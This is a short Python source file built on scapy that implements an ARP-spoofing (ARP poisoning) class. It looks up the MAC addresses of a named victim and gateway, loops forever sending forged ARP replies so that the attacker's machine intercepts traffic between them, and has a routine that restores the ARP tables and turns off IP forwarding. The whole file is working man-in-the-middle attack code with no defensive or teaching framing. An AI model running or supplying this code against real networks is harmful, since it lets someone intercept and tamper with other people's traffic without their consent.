from scapy.all import *
import sys
import os
import netifaces as ni
import time
import signal
import colors


class Arp:
    def __init__(self, gateway_ip, victim_ip, interface):
        self.gateway_ip = gateway_ip
        self.victim_ip = victim_ip
        self.interface = interface
        self.victim_mac = ""
        self.gateway_mac = ""

    # Get MAC address starting from IP address
    def get_mac(self, ip):
        conf.verb = 0
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                         timeout=2, iface=self.interface, inter=0.5)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    # Get MAC of gateway and victim
    def setup_mac(self):
        self.victim_mac = self.get_mac(self.victim_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)

    # Keep sending false ARP replies to put our machine in the middle to intercept packets
    def poison(self):
        while True:
            send(ARP(op=2, pdst=self.gateway_ip,
                     hwdst=self.gateway_mac, psrc=self.victim_ip))
            send(ARP(op=2, pdst=self.victim_ip,
                     hwdst=self.victim_mac, psrc=self.gateway_ip))
            time.sleep(2)

    # Restore ARP table
    def re_arp(self):
        print(colors.WHITE + "[*] Re-arping target.." + colors.DEFAULT)
        send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victim_mac), count=5)
        send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac), count=5)

        # Disable ip_forwarding
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
